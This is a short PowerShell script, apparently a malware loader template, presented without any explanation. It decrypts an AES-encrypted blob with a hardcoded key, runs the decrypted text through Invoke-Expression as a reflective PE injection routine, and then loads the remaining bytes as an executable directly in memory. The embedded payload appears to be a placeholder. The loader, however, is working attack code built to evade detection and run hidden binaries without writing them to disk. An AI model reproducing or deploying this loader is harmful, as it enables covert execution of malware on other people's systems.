$key = "ba53a14282dc80196305923ad71ec30b";
$encryptedStringWithIV = "VGhpcyBpcyBhbiBJVjEyM6rf";
$aesManaged = New-Object "System.Security.Cryptography.AesManaged";
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; 
$aesManaged.BlockSize = 128;
$aesManaged.KeySize = 128;
$aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($key); 
$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV);
$aesManaged.IV = $bytes[0..15];
$unencryptedData = $aesManaged.CreateDecryptor().TransformFinalBlock($bytes, 16, $bytes.Length - 16);
$reflectionLen = [bitconverter]::ToInt32($unencryptedData[0..3], 0) + 1;
$reflectivePEInjection = [System.Text.Encoding]::UTF8.GetString($unencryptedData[4..$reflectionLen]);
Invoke-Expression $reflectivePEInjection;
$binaryStart = $reflectionLen + 3;
$binaryEnd = $unencryptedData.length;
Invoke-ReflectivePEInjection -PEBytes $unencryptedData[$binaryStart..$binaryEnd];
$aesManaged.Dispose();




